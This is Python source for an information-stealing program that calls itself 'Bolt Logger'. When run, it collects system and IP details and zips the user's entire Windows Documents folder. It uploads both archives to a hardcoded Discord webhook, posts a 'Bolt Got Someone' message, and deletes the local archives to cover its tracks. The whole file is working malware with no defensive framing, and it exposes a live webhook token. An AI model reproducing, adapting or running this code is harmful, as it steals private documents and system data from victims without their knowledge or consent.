import requests
import zipfile
import os
import json
import http.client

webhook_url = 'https://discord.com/api/webhooks/1069971959179395082/OaX8LVPgy2U1c240ow7XeoqCJuGDdWXRhpBpJlr1ZbBCBO7XiLbI_kQhdYf6LHERu9QT'

from Source_Data.Geolocation import *
from Source_Data.System import *

def create_zip_file():
    with open("ip_data.txt", "w") as art:
        art.write(get_system_info())
    with open("system_data.txt", "w") as tart:
        tart.write(get_ip_info())

    with zipfile.ZipFile("Data_Vault.zip", "w") as zip_file:
        zip_file.write("ip_data.txt")
        zip_file.write("system_data.txt")

    return "Data_Vault.zip"

def zip_document_directory():
    directory_to_be_zipped = r"C:\Users\{}\Documents".format(os.getlogin())
    zip_file_name = "Logged_Documents.zip"

    def add_to_zip(zip_file, directory, path_in_zip):
        try:
            for item in os.listdir(directory):
                item_path = os.path.join(directory, item)
                path_in_zip = os.path.join(path_in_zip, item)
                if os.path.isfile(item_path):
                    zip_file.write(item_path, path_in_zip)
                elif os.path.isdir(item_path):
                    zip_file.write(item_path, path_in_zip)
                    add_to_zip(zip_file, item_path, path_in_zip)
        except:
            pass

    try:
        with zipfile.ZipFile(zip_file_name, "w") as zip:
            add_to_zip(zip, directory_to_be_zipped, "")
    except:
        pass

    with open(zip_file_name, "rb") as file:
        files = {"file": file}
        Maximus = {
            "username": "Bolt Logger",
            "avatar_url": "https://imgs.search.brave.com/3x4CHpfQhDt48Njr_LbS7rle17jlN_SvUmWW_B9Mr9s/rs:fit:1200:1200:1/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvcHJl/dmlld3MvMDAwLzUz/My81Mzgvb3JpZ2lu/YWwvdmVjdG9yLWxp/Z2h0bmluZy1ib2x0/LWljb24uanBn"
        }
        response = requests.post(webhook_url, data=Maximus, files=files)



def send_zip_to_webhook(zip_file_name, webhook_url):
    with open(zip_file_name, "rb") as zip_file:
        JSON = {
            "username": "Bolt Logger",
            "avatar_url": "https://imgs.search.brave.com/3x4CHpfQhDt48Njr_LbS7rle17jlN_SvUmWW_B9Mr9s/rs:fit:1200:1200:1/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvcHJl/dmlld3MvMDAwLzUz/My81Mzgvb3JpZ2lu/YWwvdmVjdG9yLWxp/Z2h0bmluZy1ib2x0/LWljb24uanBn"
        }
        response = requests.post(webhook_url, data=JSON, files={"file": zip_file})

resp = requests.post(webhook_url, json={
    "content": "``Bolt Got Someone``",
    "username": "Bolt Logger",
    "avatar_url": "https://imgs.search.brave.com/3x4CHpfQhDt48Njr_LbS7rle17jlN_SvUmWW_B9Mr9s/rs:fit:1200:1200:1/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvcHJl/dmlld3MvMDAwLzUz/My81Mzgvb3JpZ2lu/YWwvdmVjdG9yLWxp/Z2h0bmluZy1ib2x0/LWljb24uanBn",
    "embeds": [{
        "type": "rich",
        "title": "Bolt 1#",
        "description": ("```📂 Data_Vault\n"
                    "  └──📄 ip_data.txt\n"
                    "  └──📄 system_data.txt```\n```📂 - Logged_Documents\n  └──📄 Contains All Document Data.```"),
        "image": {
            "url": "https://imgs.search.brave.com/vYlx-fLtDZmMyHkk8qEvVRwfjcA7lBFsDjP44LqyEfM/rs:fit:1024:768:1/g:ce/aHR0cHM6Ly9naWZp/bWFnZS5uZXQvd3At/Y29udGVudC91cGxv/YWRzLzIwMTcvMDkv/YW5pbWF0ZWQtbGln/aHRuaW5nLWdpZi05/LmdpZg.gif",
        },
        "footer": {
            "text": "Bolt 1#, A trusted logger.."
        }
    }]
})

zip_document_directory()
send_zip_to_webhook(create_zip_file(), webhook_url)

try:
    os.remove("Logged_Documents.zip")
    os.remove("Data_Vault.zip")
    os.remove("system_data.txt")
    os.remove("ip_data.txt")
except:
    pass